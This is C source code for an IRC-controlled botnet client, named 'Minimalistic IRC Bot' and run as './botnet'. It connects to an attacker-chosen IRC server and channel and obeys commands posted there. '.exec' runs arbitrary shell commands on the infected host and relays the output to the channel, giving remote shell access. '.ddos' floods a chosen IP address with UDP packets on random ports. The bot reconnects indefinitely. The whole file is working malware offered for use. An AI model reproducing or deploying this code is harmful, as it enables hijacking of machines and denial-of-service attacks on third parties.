/*
 *
 * Minimalistic IRC Bot
 * Written by: Michael Coppola
 * URL: http://www.poppopret.org/
 *
 * ./botnet 1.2.3.4 6667 \#channel nickprefix
 *
 */

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <stdio.h>

#define SHELL "/bin/msh"

void send_msg ( int sockfd, const char *format, ... )
{
    char msg[512];
    va_list argptr;
    va_start(argptr, format);
    vsnprintf(msg, sizeof(msg), format, argptr);
    write(sockfd, msg, strlen(msg));
    return;
}

int recv_msg ( int sockfd, char *msg, size_t max )
{
    int n, rc;
    char c, *buf;

    for ( n = 1; n <= max; n++ )
    {
        rc = read(sockfd, &c, 1);
        if ( rc == 1 )
        {
            if ( c == '\r' )
                continue;
            else if ( c == '\n' ) {
                *msg = 0;
                return n;
            } else
                *msg++ = c;
        }
    }
    *buf = 0;

    return rc;
}

void exec_cmd ( int sockfd, char *replyto, char *cmd )
{
    pid_t pid;
    int status, pipefd[2];
    char msg[512];

    if ( pipe(pipefd) != 0 )
    {
        send_msg(sockfd, "PRIVMSG %s :Error calling pipe()\r\n", replyto);
        return;
    }

    pid = fork();

    if ( pid < 0 ) // Error
    {
        send_msg(sockfd, "PRIVMSG %s :Error calling fork()\r\n", replyto);
        return;
    }
    else if ( pid == 0 ) // Child
    {
        close(pipefd[0]);
        dup2(pipefd[1], 1);
        dup2(pipefd[1], 2);
        close(pipefd[1]);
        execl(SHELL, SHELL, "-c", cmd, NULL);
        _exit(1);
    }
    else // Parent
    {
        FILE *stream;
        int ch;
        char buf[512];
        close(pipefd[1]);

        if ( (stream = fdopen(pipefd[0], "r")) == NULL )
        {
            send_msg(sockfd, "PRIVMSG %s :Error creating stream from fd\r\n", replyto);
            return;
        }
        while ( fgets(buf, sizeof(buf), stream) != NULL )
        {
            buf[strcspn(buf, "\n")] = '\0'; // Remove trailing newline
            send_msg(sockfd, "PRIVMSG %s :%s\r\n", replyto, buf);
        }
        return;
    }
}

void irc_bot ( char **argv )
{
    int sockfd, port, i, rc, joined = 0;
    char *endptr, *pch, *replyto, nick[33], channel[33], msg[512];
    struct sockaddr_in saddr;

    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
    {
        printf("Error creating socket.\n");
        return;
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;

    if ( inet_aton(argv[1], &saddr.sin_addr) == 0 )
    {
        printf("Invalid IP address.\n");
        exit(1);
    }

    port = strtol(argv[2], &endptr, 0);
    if ( *endptr )
    {
        printf("Invalid port number.\n");
        exit(1);
    }

    saddr.sin_port = htons(port);

    if ( connect(sockfd, (struct sockaddr *)&saddr, sizeof(saddr)) < 0 )
    {
        printf("Unable to connect to host: %s\n", argv[1]);
        return;
    }

    srand(time(NULL));
    snprintf(nick, sizeof(nick), "%s%d", argv[4], rand());
    strncpy(channel, argv[3], 32);
    send_msg(sockfd, "NICK %s\r\n", nick);
    send_msg(sockfd, "USER a b c :d\r\n");

    while ( 1 )
    {
        rc = recv_msg(sockfd, msg, sizeof(msg)-1);
        if ( rc < 0 )
        {
            printf("Error reading from socket, bailing out\n");
            return;
        }

        printf("%s\n", msg);

        pch = strtok(msg, " ");

        if ( *pch == ':' )
        {
            replyto = pch;
            while ( 1 )
            {
                if ( *replyto == '\0' )
                    break;
                else if ( *replyto == '!' )
                {
                    *replyto = '\0';
                    break;
                }
                else
                    replyto++;
            }
            replyto = pch + 1;

            pch = strtok(NULL, " ");

            if ( strcmp(pch, "001") == 0 && ! joined )
            {
                send_msg(sockfd, "JOIN %s\r\n", channel);
                joined = 1;
                continue;
            }
            else if ( strcmp(pch, "PRIVMSG") == 0 )
            {
                pch = strtok(NULL, " ");
                if ( strcmp(pch, channel) == 0 || strcmp(pch, nick) == 0 )
                {
                    if ( strcmp(pch, channel) == 0 )
                        replyto = pch;

                    pch = strtok(NULL, " ");
                    if ( strcmp(pch, ":.quit") == 0 ) // .quit Quit message
                    {
                        char *quitmsg;
                        quitmsg = pch+7;
                        send_msg(sockfd, "QUIT :%s\r\n", quitmsg);
                        close(sockfd);
                        exit(0);
                    }
                    else if ( strcmp(pch, ":.join") == 0 ) // .join #channel
                    {
                        pch = strtok(NULL, " \r\n");
                        send_msg(sockfd, "JOIN %s\r\n", pch);
                    }
                    else if ( strcmp(pch, ":.part") == 0 ) // .part #channel
                    {
                        pch = strtok(NULL, " \r\n");
                        send_msg(sockfd, "PART %s\r\n", pch);
                    }
                   else if ( strcmp(pch, ":.nick") == 0 ) // .nick nickname
                    {
                        pch = strtok(NULL, " \r\n");
                        send_msg(sockfd, "NICK %s\r\n", pch);
                    }
                    else if ( strcmp(pch, ":.exec") == 0 ) // .exec ls -la
                    {
                        char *cmd;
                        cmd = pch+7;
                        exec_cmd(sockfd, replyto, cmd);
                    }
                    else if ( strcmp(pch, ":.ddos") == 0 ) // .ddos 1.2.3.4 1000
                    {
                        struct sockaddr_in si_other;
                        int s, i;
                        char garbage[] = "XXXXXXXXXX\0";

                        char *ip = strtok(NULL, " ");
                        int num = atoi(strtok(NULL, " \r\n"));

                        send_msg(sockfd, "PRIVMSG %s :Sending %d UDP packets to %s\r\n", replyto, num, ip);

                        if ( (s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1 )
                        {
                            send_msg(sockfd, "PRIVMSG %s :Error creating UDP socket!\r\n", replyto);
                            continue;
                        }

                        memset((char *)&si_other, 0, sizeof(si_other));
                        si_other.sin_family = AF_INET;
                        if ( inet_aton(ip, &si_other.sin_addr) == 0 )
                        {
                            send_msg(sockfd, "PRIVMSG %s :Error parsing IP address\r\n", replyto);
                            continue;
                        }

                        for ( i = 0; i < num; i++ )
                        {
                            si_other.sin_port = htons(1 + rand() % 65535);
                            //send_msg(sockfd, "PRIVMSG %s :Sending packet to port %d\r\n", replyto, si_other.sin_port);
                            if ( sendto(s, garbage, sizeof(garbage), 0, (struct sockaddr *)&si_other, sizeof(si_other)) < 0 )
                            {
                                send_msg(sockfd, "PRIVMSG %s :Error sending UDP packet\r\n", replyto);
                                break;
                            }
                        }
                        send_msg(sockfd, "PRIVMSG %s :UDP flood complete\r\n", replyto);
                        close(s);
                    }
                    else if ( strcmp(pch, ":.die") == 0 ) // .die
                    {
                        exit(0);
                    }
                }
            }

        }
        else if ( strcmp(pch, "PING") == 0 )
        {
            pch = strtok(NULL, " \r\n");
            send_msg(sockfd, "PONG %s\r\n", pch);
        }
    }

    close(sockfd);
}

int main ( int argc, char **argv )
{
    while ( 1 )
    {
        irc_bot(argv);
        sleep(2);
    }
}
